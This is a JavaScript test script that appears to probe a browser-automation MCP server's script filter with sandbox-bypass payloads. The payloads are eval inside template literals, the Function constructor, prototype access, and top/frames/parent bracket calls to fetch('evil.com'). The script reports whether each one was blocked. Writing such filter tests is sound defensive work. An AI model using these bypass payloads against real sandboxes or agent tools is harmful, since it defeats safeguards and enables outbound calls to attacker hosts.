import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";

const t = new StdioClientTransport({
  command: "node",
  args: ["/Users/tongwu/Projects/novada-mcp/build/index.js"],
  env: Object.assign({}, process.env, { NOVADA_API_KEY: "dummy" }),
});
const c = new Client({ name: "qa", version: "0" }, { capabilities: {} });
await c.connect(t);

// Test additional bypass techniques
const tests = [
  // Template literal eval bypass
  { name: "template_literal_eval", script: "`${eval('fetch()')}`" },
  // Indirect function constructor
  { name: "indirect_fn_constructor", script: "(function(){}).constructor('return fetch')()" },
  // document.createElement with CRLF
  { name: "document_script_create", script: "document.createElement('script')" },
  // Prototype access
  { name: "prototype_access", script: "Object.getOwnPropertyDescriptor(window, 'fetch')" },
  // top[] access
  { name: "top_bracket_access", script: 'top["fetch"]("evil.com")' },
  // frames[] access
  { name: "frames_bracket_access", script: 'frames["fetch"]("evil.com")' },
  // parent bracket access  
  { name: "parent_bracket_access", script: 'parent["fetch"]("evil.com")' },
  // Trusted normal script
  { name: "normal_script_ok", script: "document.title" },
];

for (const test of tests) {
  try {
    const r = await c.callTool({ name: "novada_browser", arguments: {
      actions: [{ action: "evaluate", script: test.script }]
    }});
    const text = r.content?.[0]?.text ?? JSON.stringify(r);
    const blocked = r.isError || text.includes('BLOCKED') || text.includes('Invalid parameters');
    console.log(`[${blocked ? 'BLOCKED' : 'PASSED'}] ${test.name}: ${test.script.slice(0, 60)}`);
    if (!blocked) {
      console.log(`  -> POSSIBLE BYPASS: ${text.slice(0, 100)}`);
    }
  } catch(e) {
    console.log(`[THREW] ${test.name}: ${e.message?.slice(0, 100)}`);
  }
}

await c.close();
